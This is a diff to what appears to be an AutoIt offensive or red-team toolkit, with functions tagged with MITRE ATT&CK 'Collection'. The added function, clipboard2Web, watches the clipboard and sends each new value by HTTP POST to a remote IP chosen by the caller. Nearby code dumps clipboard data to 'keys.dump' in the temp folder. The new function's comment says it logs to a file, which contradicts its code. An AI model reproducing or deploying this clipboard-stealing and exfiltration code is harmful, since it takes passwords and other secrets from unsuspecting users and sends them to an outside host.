@@ -78,6 +78,23 @@ Func clipboard2Log($timeOut = 10, $pathLog = @TempDir & "\keys.dump");DESCRIPTIO
    WEnd
 EndFunc
 
+Func clipboard2Web($ip, $tag, $timeOut = 10);DESCRIPTION:Log to file the data stored in the clipboard;MITRE:Collection
+   $buffer=""
+   While 1
+	  if $timeOut > 0 Then
+		 $Data = ClipGet()
+		 Sleep(1000)
+		 if $buffer <> $Data Then
+			$buffer = $Data
+			HttpPost($ip, $tag, $buffer)
+		 EndIf
+		 $timeOut=$timeOut-1
+	  Else
+		 return True
+	  EndIf
+   WEnd
+EndFunc
+
 Func Log2File($log, $pathFile);DESCRIPTION:Log to file buffer of data;MITRE:Collection
     ;Local Const $sFilePath = _WinAPI_GetTempFileName(@TempDir)
 	Local Const $sFilePath = $pathFile
